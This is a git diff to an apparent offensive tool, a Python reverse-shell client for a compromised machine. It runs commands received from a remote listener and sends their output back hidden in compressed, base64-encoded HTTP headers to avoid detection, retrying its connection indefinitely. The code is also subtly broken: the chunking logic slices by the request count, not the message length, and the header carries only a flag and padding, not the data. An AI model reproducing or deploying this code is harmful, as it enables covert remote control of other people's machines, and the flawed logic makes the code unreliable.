@@ -4,10 +4,12 @@ Executes on the compromised machine. A reverse shell that communicates with the 
 
 import requests
 import base64
+from math import ceil
+from time import sleep
 import os
 import subprocess
 import zlib
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
@@ -30,7 +32,7 @@ def get_random_url():
 def compress_and_encode_string(string: str):
     '''
     Compresses the given string to reduce size of packets sent (reducing chance of detection). 
-    Then, encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
+    Then, base64 encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
     
     Arguments:
         string (str): String to be compressed and encoded
@@ -63,21 +65,37 @@ def send_stego_data_to_listener(data: str):
     Returns:
         str: Reply string found within the listener's HTTP response.
     '''
-    # # Send the data as part of the HTTP header
-    headers = {
-        STEGO_HEADER_NAME: compress_and_encode_string(data)
-    }
-    url = get_random_url()
-    response = None
-    # Keep attempting to request the listener until a response is received.
-    while (response is None):
+    compressed_data = compress_and_encode_string(data)
+    # Calculate number of requests needed to send full data
+    request_count = ceil(len(compressed_data) / CLIENT_MAX_MESSAGE_LENGTH)
+    compressed_data_split = [""]
+    if len(compressed_data) != 0:
+        # Create a str list where each element is meant to be sent in one request
+        compressed_data_split = [compressed_data[i:i+request_count] for i in range(0, len(compressed_data), request_count)]
+        # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
+    while (True):
         try:
-            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
-        except:
+            reply = ""
+            for i in range(request_count):
+                if i == request_count - 1:
+                    # Indicates to listener that this is last request.
+                    first_char = "1"
+                else:
+                    # Indicates to listener that this request is not the last.
+                    first_char = "2"
+                # Send the data as part of the HTTP header
+                headers = {
+                    STEGO_HEADER_NAME: first_char + (len(compressed_data_split[i]) % 4) * "=" # Ensure padding such that data (excluding first char) is valid base64
+                }
+                url = get_random_url()
+                # for now, listener reply is simply stored in the response text
+#               TODO: store and retrieve it via image steganoraphy
+                reply = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT).text
+            return reply
+        except Exception as e:
+            print(e)
+            sleep(5) # Ensures connection retries aren't sent too frequently
             continue
-    # for now, listener reply is simply stored in the response text
-    # TODO: store it via image steganoraphy
-    return response.text
 
 def execute_command_line_input(input: str):
     '''
@@ -90,7 +108,8 @@ def execute_command_line_input(input: str):
     Returns:
         str: The command-line output from executing the input
     '''
-    # TODO: change this copied logic
+    if (input == ""):
+        return ""
     split_input = input.split()
     if split_input[0].lower() == "cd":
         # Need to handle 'cd' manually, cannot use `subprocess` library
@@ -103,6 +122,8 @@ def execute_command_line_input(input: str):
     else:
         # Execute the command and retrieve the output (might be an error message if command couldn't execute)
         output = subprocess.getoutput(input)
+        #  TODO: allow long-running processes
+        # subprocess.run(args=input, stdout=None, stderr=None, capture_output=True)
         print(f"OUTPUT: {output}")
     return output
 
